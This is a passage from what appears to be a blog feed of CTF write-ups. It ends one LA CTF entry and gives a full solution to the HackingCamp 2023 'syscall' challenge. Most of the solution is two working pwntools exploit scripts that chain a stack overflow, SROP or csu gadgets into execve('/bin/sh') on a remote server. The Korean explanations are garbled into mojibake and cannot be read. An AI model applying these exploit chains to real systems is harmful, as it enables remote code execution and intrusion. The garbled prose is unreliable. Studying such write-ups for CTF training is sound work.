Ìï®ÏàòÍ∞Ä Ïã§ÌñâÎêòÏñ¥ ÌîåÎûòÍ∑∏Î•º ÌöçÎìùÌï† Ïàò ÏûàÏóàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@arch gatekeep]$ nc lac.tf 31121</span><br><span class="line">aIf I gaslight you enough, you won&#x27;t be able to guess my password! :)</span><br><span class="line">Password:</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">I swore that was the right password ...</span><br><span class="line">Guess I couldn&#x27;t gaslight you!</span><br><span class="line">lactf&#123;sCr3am1nG_cRy1Ng_tHr0w1ng_uP&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;sCr3am1nG_cRy1Ng_tHr0w1ng_uP&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>(author) Winter HackingCamp CTF 2023 - syscall (SROP)</title>
      <link href="/230211-hcamp2023w-syscall/"/>
      <url>/230211-hcamp2023w-syscall/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://hackingcamp.org/">http://hackingcamp.org/</a></li></ul><p>Ïò¨Ìï¥ÎèÑ Ïñ¥ÍπÄÏóÜÏù¥ Ìï¥ÌÇπÏ∫†ÌîÑ Î¨∏Ï†ú Ï∂úÏ†úÎ•º ÌïòÏòÄÎã§. ÎåÄÌöå ÏãúÍ∞ÑÏù¥ ÍΩ§ ÏßßÍ≥† Îã§Î•∏ Ïñ¥Î†§Ïö¥ Ìè¨ÎÑàÎ∏î Î¨∏Ï†úÍ∞Ä ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê Î¨∏Ï†ú ÌíÄÏù¥ Ìï¥Ï£ºÏã† Î∂ÑÎì§ÏùÄ ÌíÄÏù¥Í∞Ä ÏÉÅÎåÄÏ†ÅÏúºÎ°ú Ïâ¨Ïö¥ <code>Sigreturn-oriented programming(SROP)</code>Î•º Ïù¥Ïö©ÌïòÏó¨ Î¨∏Ï†úÎ•º ÌíÄÏù¥Ìï¥Ï£ºÏÖ®ÏùÑ Í≤ÉÏù¥Îùº ÏÉùÍ∞ÅÎêúÎã§. ÎÇòÎäî Î¨∏Ï†ú Ï∂úÏ†úÌïòÎ©¥ÏÑú Îëê Í∞ÄÏßÄ Î∞©Î≤ïÏúºÎ°ú ÌíÄÏù¥ÌïòÏòÄÍ≥† Ï†ïÏûë <code>SROP</code>Îäî ÏÉùÍ∞ÅÏù¥ ÎÇòÏßÄ ÏïäÏïÑ Îã§Î•∏ Î∞©Î≤ïÏúºÎ°ú Ìëº ÌõÑÏóê <code>SROP</code>Î°ú ÌíÄÏù¥ÌïòÏòÄÎã§.</p><p>Î°∏ÏóÖÏùÑ ÏûëÏÑ±ÌïòÎ©¥ÏÑú ÏÉùÍ∞ÅÎì† Í±¥Îç∞ seccompÍ≥º Í∞ôÏùÄ Í≤ÉÏùÑ ÎëêÏßÄ ÏïäÏïòÏúºÎãà ÏÑúÎ≤ÑÏóê Ï°¥Ïû¨ÌïòÎäî flag ÌååÏùºÏùò Ïù¥Î¶ÑÏùÑ ÏïåÏïÑÎÇ∏ Îã§Ïùå, <code>openat, read, write</code> Ìï¥ÏÑú Î¨∏Ï†úÎ•º ÌíÄÏù¥Ìï† Ïàò ÏûàÏùÑ Í≤É Í∞ôÎã§. Ìï¥Îãπ Î∞©Î≤ïÏùÄ Ïñ∏Ïù∏ÌÖêÏù¥ ÏïÑÎãàÎ©∞ Ï¥àÏã¨ÏûêÎ•º ÏúÑÌïú Ìï¥ÌÇπÏ∫†ÌîÑ Ï∑®ÏßÄÏóê ÎßûÍ≤å Îã§ÏñëÌïú ÌíÄÏù¥Í∞Ä Í∞ÄÎä•ÌïòÎèÑÎ°ù Î≥¥Ìò∏ Í∏∞Î≤ïÏùÑ Í∞ïÌïòÍ≤å Ï†úÌïúÏùÑ ÎëêÏßÄ ÏïäÏïòÎã§. Í∞úÏù∏Ï†ÅÏúºÎ°ú flag Í∞íÏùÑ ÏùΩÏñ¥Ïò§Îäî Í≤ÉÎ≥¥Îã® Ïâò Îî∞Îäî Í≤ÉÏù¥ Îçî Ïû¨Î∞åÍ∏∞ ÎïåÎ¨∏Ïóê.. Ìï¥Îãπ ÌíÄÏù¥Îäî ÏÜåÍ∞úÌïòÏßÄ ÏïäÎäîÎã§.</p><blockquote><p>ÏõêÌïòÎäî system callÏùÑ Ïã§ÌñâÏãúÏºúÎ≥¥Ïûê!<br><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a><br>tar -zxvf syscall-public.tar.gz</p></blockquote><ul><li>[ 3 solves &#x2F; 428 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = sys_write(<span class="number">1u</span>, gloabl_buf, <span class="number">0xC</span>uLL);</span><br><span class="line">  v4 = sys_read(<span class="number">0</span>, buf, <span class="number">0x250</span>uLL); <span class="comment">// overflow</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ï†ÑÏó≠Î≥ÄÏàòÏóê Ï†ÅÌûå Í∞íÏùÑ Ï∂úÎ†•ÌïòÍ≥†, ÏßÄÏó≠Î≥ÄÏàòÏóê Í∞íÏùÑ ÏûÖÎ†• Î∞õÎäîÎç∞ Ïó¨Í∏∞ÏÑú overflowÍ∞Ä ÎåÄÎÜìÍ≥† Î∞úÏÉùÌïúÎã§. Ï£ºÏñ¥ÏßÑ ÏΩîÎìúÎäî Ïù¥Í≤å Îã§Í≥†, ÎÇ¥Í∞Ä ÏûëÏÑ±Ìïú Í≤ÉÏùÑ Ï∂úÎ†•Ìï¥ Ï£ºÎäî Í∏∞Îä•Ïù¥ ÌòÑÏû¨Î°úÏÑ† Ï°¥Ïû¨ÌïòÏßÄ ÏïäÍ∏∞ ÎïåÎ¨∏Ïóê Î≠îÍ∞à leakÌï† ÏàòÎèÑ ÏóÜÏñ¥ Î≥¥Ïù∏Îã§. Í∑∏Îü¨ÎÇò Ìï®Ïàò Î™©Î°ùÏùÑ Î≥¥Î©¥ ÏïÑÎûòÏôÄ Í∞ôÏùÄ hint Ìï®ÏàòÍ∞Ä Ï°¥Ïû¨ÌïòÍ≥† Ïú†Ïö©Ìïú Í∞ÄÏ†ØÏù¥ Î≥¥Ïù∏Îã§. </p><img src="/images/230211-hcamp2023w-syscall/Screenshot 2023-02-11 at 14.33.13.png" width=500/><br><p>Î≥¥Í∏∞ ÏâΩÍ≤å ÎÇòÌÉÄÎÇ¥Î©¥ ÏïÑÎûò Îëê Í∞ÄÏ†ØÏù¥ ÎààÏóê Î≥¥Ïù∏Îã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add rax, 0x1 ; ret ;</span><br><span class="line">syscall ; ret ;</span><br></pre></td></tr></table></figure><p>Ïù¥Í≤ÉÏùÑ Ïù¥Ïö©ÌïòÏó¨ Ïö∞Î¶¨Îäî ÏõêÌïòÎäî system callÏùÑ Ïã§ÌñâÏãúÌÇ¨ Ïàò ÏûàÎã§. Î¨∏Ï†ú Î∞îÏù¥ÎÑàÎ¶¨Îäî 64bit Ï†ÑÏö© ELFÏù¥Îãà Î¨∏Ï†ú ÏÑ§Î™ÖÏóê ÎÇòÏôÄÏûàÎçò ÏÇ¨Ïù¥Ìä∏Î•º Ï†ëÏÜçÌï¥Î≥¥Ïûê.</p><ul><li><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></li></ul><p>overflowÎèÑ Î∞úÏÉùÌïòÍ≤†Îã§.. <code>rax</code> Î†àÏßÄÏä§ÌÑ∞Î•º Ï°∞ÏûëÌïòÏó¨ Ïö∞Î¶¨Îäî Ï†Ä ÏÇ¨Ïù¥Ìä∏Ïóê ÏûàÎäî system callÎì§ÏùÑ Ïã§ÌñâÏãúÌÇ¨ Ïàò ÏûàÎã§.</p><h2 id="Solve-1-Sigreturn-oriented-programming-SROP"><a href="#Solve-1-Sigreturn-oriented-programming-SROP" class="headerlink" title="Solve 1 (Sigreturn-oriented programming(SROP))"></a>Solve 1 (Sigreturn-oriented programming(SROP))</h2><ul><li>Sigreturn system callÏùÑ ÏÇ¨Ïö©ÌïòÎäî ROP Í∏∞Î≤ï</li></ul><p>ÌîÑÎ°úÍ∑∏Îû®ÏùÄ Î≥¥Ïïà, ÏûêÏõê Í¥ÄÎ¶¨ Îì±Ïùò Ïù¥Ïú†Î°ú user modeÏôÄ kernel modeÎ•º ÏôîÎã§Í∞îÎã§ ÌïòÎ©¥ÏÑú Ïã§ÌñâÎêòÎäîÎç∞ Ïù¥ Îïå ÏûêÏõê Í≥µÏú†Í∞Ä ÌïÑÏöîÌïòÎã§. kernel modeÏóêÏÑú user modeÎ°ú Í∞à Îïå <code>Sigreturn system call</code>ÏùÑ Ïù¥Ïö©ÌïòÏó¨ user modeÏùò Î†àÏßÄÏä§ÌÑ∞Î•º ÏÑ∏ÌåÖÌïúÎã§. Ï†Ä ÏãúÏä§ÌÖú ÏΩúÏùÑ ÏÇ¨Ïö©ÌïòÏó¨ Î†àÏßÄÏä§ÌÑ∞Î•º ÏÑ∏ÌåÖÌï† Îïå Í∞íÏóê ÎåÄÌïú Í≤ÄÏ¶ùÏù¥ Ïù¥Î£®Ïñ¥ÏßÄÏßÄ ÏïäÎäîÎã§. Í∑∏ÎûòÏÑú Ïö∞Î¶¨Îäî <code>Sigreturn system call</code>ÏùÑ Í∞ïÏ†úÎ°ú Ìò∏Ï∂úÌïòÏó¨ Î†àÏßÄÏä§ÌÑ∞Î•º ÎßàÏùåÎåÄÎ°ú Î∞îÍøÄ Ïàò ÏûàÎã§.</p><p><code>pwntools</code>Ïùò <code>frame = SigreturnFrame()</code>ÏùÑ Ïù¥Ïö©ÌïòÏó¨ Îß§Ïö∞ Ìé∏Î¶¨ÌïòÍ≤å ÏΩîÎìúÎ•º ÏûëÏÑ±Ìï† Ïàò ÏûàÎã§.</p><ul><li>exploit ÏãúÎÇòÎ¶¨Ïò§</li></ul><ol><li>Ï†ÑÏó≠Î≥ÄÏàòÏóê <code>/bin/sh\x00</code> ÏûëÏÑ± -&gt; <code>read(0, 0x404028, 8)</code></li><li>mainÏúºÎ°ú ÎèåÎ¶º</li><li><code>SigreturnFrame()</code>ÏùÑ Ïù¥Ïö©ÌïòÏó¨ Ìé∏Î¶¨ÌïòÍ≤å Î†àÏßÄÏä§ÌÑ∞ ÏÑ∏ÌåÖ -&gt; <code>execve(&#39;/bin/sh\x00&#39;, 0, 0)</code>ÏùÑ Ïã§ÌñâÏãúÌÇ§Í∏∞ ÏúÑÌï®</li><li><code>execve(&#39;/bin/sh\x00&#39;, 0, 0)</code> Ïã§Ìñâ</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;3.38.2.179&#x27;, 1337)</span></span><br><span class="line">p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">32860</span>)</span><br><span class="line"></span><br><span class="line">add_rax = <span class="number">0x40110e</span></span><br><span class="line">syscall = <span class="number">0x401113</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4011c1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== first main ====================</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, 0x404028, 8)</span></span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x404028</span>) <span class="comment"># bss</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== second main ====================</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = <span class="number">0x404028</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rax = 0x0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xf</span>): </span><br><span class="line">    payload += p64(add_rax)</span><br><span class="line"></span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Solve-2-run-execute-‚Äò-x2F-bin-x2F-sh-x00‚Äô-0-0"><a href="#Solve-2-run-execute-‚Äò-x2F-bin-x2F-sh-x00‚Äô-0-0" class="headerlink" title="Solve 2 (run execute(‚Äò&#x2F;bin&#x2F;sh\x00‚Äô, 0, 0))"></a>Solve 2 (run execute(‚Äò&#x2F;bin&#x2F;sh\x00‚Äô, 0, 0))</h2><p>SROP Í∏∞Î≤ïÏùÑ Ïù¥Ïö©ÌïòÏßÄ ÏïäÍ≥† <code>execute(&#39;/bin/sh\x00&#39;, 0, 0)</code>ÏùÑ Ïã§ÌñâÏãúÌÇ§Îäî Í≤ÉÏùÑ Î™©ÌëúÎ°ú ÎëêÎäî ÌíÄÏù¥Ïù¥Îã§. </p><ol><li><p><code>write(1, stackÏ£ºÏÜå, ?)</code> Ìò∏Ï∂ú<br>main Ìï®ÏàòÏóêÏÑú <code>sys_read(0, buf, 0x250uLL);</code> Ïã§ÌñâÌïòÍ≥† ÎÇú Îí§Í∏∞ ÎïåÎ¨∏Ïóê <code>rax</code> Î†àÏßÄÏä§ÌÑ∞ÏôÄ <code>rdi</code> Î†àÏßÄÏä§ÌÑ∞Îßå ÏàòÏ†ïÌï¥ÏÑú <code>write</code> Ìï®ÏàòÎ•º Ìò∏Ï∂úÌïòÏó¨ stack Ï£ºÏÜåÎ•º leakÌï† Ïàò ÏûàÎã§. (stackÏóê Ïì∞Ïó¨ÏßÑ Í±¥ Î™®Îëê leakÌï† Ïàò ÏûàÍ≥† stackÏóêÎäî stack Ï£ºÏÜåÎèÑ ÎåÄÎ∂ÄÎ∂Ñ Ï†ÅÌòÄÏûàÎã§.)</p></li><li><p><code>read(0, 0x404028, 8)</code> Ìò∏Ï∂ú<br>bss ÏòÅÏó≠Ïóê ‚Äò&#x2F;bin&#x2F;sh\x00‚ÄôÏùÑ Ïì∏ Í≤ÉÏù¥Îã§. Ïì∞Í≥† ÎÇú ÌõÑ <code>execute(&#39;/bin/sh\x00&#39;, 0, 0)</code>ÏùÑ Ïã§ÌñâÌï† ÏòàÏ†ïÏù¥Îã§.</p></li><li><p><code>execute(&#39;/bin/sh\x00&#39;, 0, 0)</code> Ìò∏Ï∂ú<br>Ïù∏Ïûê ÏÑ∏ Í∞úÎ•º Ï°∞Ï†àÌï¥Ïïº ÌïúÎã§. Ïù¥ Îïå <code>rdx</code>Î•º Ï°∞Ï†àÌïòÍ∏∞ Ï†ÅÎãπÌïú Í∞ÄÏ†ØÏù¥ ÏóÜÏñ¥ÏÑú <code>csu gadget</code>ÏùÑ Ïù¥Ïö©ÌïòÏòÄÎã§.</p></li></ol><img src="/images/230211-hcamp2023w-syscall/Screenshot 2023-02-11 at 15.09.07.png" width=600/><p>Ïù¥ Îïå <code>[r15 + rbx*8]</code> ÏóêÎäî ÌòÑÏû¨ ÏûëÏÑ±Ìïú payloadÏùò ÏïÑÎûò Î∂ÄÎ∂ÑÏùÑ ÏûëÏÑ±Ìï¥Ï£ºÎäî Í≤ÉÏù¥ Ïú†Î¶¨ÌïòÎã§. 1Î≤à Í≥ºÏ†ïÏóêÏÑú stack Ï£ºÏÜåÎ•º leakÌñàÏúºÎãà Ïö∞Î¶¨ payloadÍ∞Ä Ïñ¥Îäê Ï£ºÏÜåÏóê Ï†ÅÌûåÏßÄÎèÑ Íµ¨Ìï† Ïàò ÏûàÎã§. ÏùµÏä§ ÏΩîÎìú Ï£ºÏÑùÏùÑ Î≥¥Î©¥ ÎÇòÎäî <code>rdi</code> Î†àÏßÄÏä§ÌÑ∞Î•º ÏÑ∏ÌåÖÌï¥Ï£ºÎäî Í≥≥ÏùÑ Í∞ÄÎ¶¨Ïº∞Îã§. Ï†ïÎ¶¨ÌïòÎ©¥ <code>csu</code> Í∞ÄÏ†ØÏúºÎ°ú <code>edi</code>, <code>rsi</code>, <code>rdx</code>¬†Î™®Îëê ÏÑ∏ÌåÖÌï† Ïàò ÏûàÎäîÎç∞ Îã§ 0ÏúºÎ°ú Ìï¥ÎÜìÍ≥† ÌõÑÏóê <code>rdi</code>Î•º Îã§Ïãú ÏÑ∏ÌåÖÌï¥Ï§¨Îã§.</p><p>Ìé∏Î¶¨ÌïòÍ≤å write, read, execute Ìï®Ïàò ÏûêÏ≤¥Î•º Ìò∏Ï∂úÌïòÎäî Í≤ÉÏ≤òÎüº ÏãúÎÇòÎ¶¨Ïò§Î•º ÏûëÏÑ±ÌïòÏòÄÏßÄÎßå Ìò∏Ï∂úÌï¥ÏïºÌï† Í≤ÉÏùÄ system callÏù¥ÎùºÎäî Í≤ÉÏùÑ ÏûäÏßÄ ÎßêÏûê. system callÏù¥Îãà ÎßåÌÅº Ìï®ÏàòÎ•º Ìò∏Ï∂úÌïòÎ©¥ ÏïàÎêòÍ≥† Î¨∏Ï†ú ÏÑ§Î™ÖÏùò ÏÇ¨Ïù¥Ìä∏Î•º Ï∞∏Í≥†ÌïòÏó¨ Ïò¨Î∞îÎ•∏ Í∞íÏúºÎ°ú <code>rax</code> Î†àÏßÄÏä§ÌÑ∞Î•º ÏÑ∏ÌåÖÌïú Îã§Ïùå <code>syscall</code> Í∞ÄÏ†ØÏùÑ Ìò∏Ï∂úÌï¥Ïïº ÌïúÎã§. Í∑∏Î¶¨Í≥† ÌòÑÏû¨ Î†àÏßÄÏä§ÌÑ∞Ïùò ÏÉÅÌô©Ïóê ÎßûÍ≤å <code>add rax, 0x1 ; ret ;</code> Í∞ÄÏ†ØÏùÑ Ìò∏Ï∂úÌïòÏûê. 0x3bÎ°ú ÏÑ∏ÌåÖÌï¥Ï§òÏïº ÌïúÎã§Í≥† Î¨¥ÏûëÏ†ï 0x3bÎ≤à Ìò∏Ï∂úÌïòÎ©¥ ÏïàÎêúÎã§Îäî ÎúªÏù¥Îã§. ÏôúÎÉêÌïòÎ©¥ Í∑∏ ÎãπÏãú <code>rax</code> Î†àÏßÄÏä§ÌÑ∞Í∞Ä 0Ïù¥ÎûÄ Î≥¥Ïû•ÏùÑ Ìï† Ïàò ÏóÜÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§. </p><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;3.38.2.179&#x27;, 1337)</span></span><br><span class="line">p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">32860</span>)</span><br><span class="line"></span><br><span class="line">add_rax = <span class="number">0x40110e</span></span><br><span class="line">syscall = <span class="number">0x401113</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4011c1</span></span><br><span class="line">pop_rdi = <span class="number">0x4011c3</span></span><br><span class="line"></span><br><span class="line">csu_init = <span class="number">0x4011BA</span></span><br><span class="line">csu_call = <span class="number">0x4011A0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== first main ====================</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(add_rax)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(<span class="number">0x68</span>)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== second main ====================</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, 0x404028, 8)</span></span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x404028</span>) <span class="comment"># bss</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rdx = 0</span></span><br><span class="line">payload += p64(csu_init) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># rbp</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># r12 (edi)</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># r13 (rsi)</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># r14 (rdx)</span></span><br><span class="line">payload += p64(stack - <span class="number">0x60</span>) <span class="comment"># [r15 + rbx*8] stack-0x60 = pop_rdi ...</span></span><br><span class="line"></span><br><span class="line">payload += p64(csu_call)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi) <span class="comment"># &lt;- stack-0x60 is here</span></span><br><span class="line">payload += p64(<span class="number">0x404028</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rax = 0x3b</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x33</span>): <span class="comment"># rax = 0x8</span></span><br><span class="line">    payload += p64(add_rax)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&#x27;/bin/sh\x00&#x27;, 0, 0)</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HCAMP&#123;cf518127a07c471e00dcfca20a5ca08f&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> HCAMP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hacking Camp </tag>
            
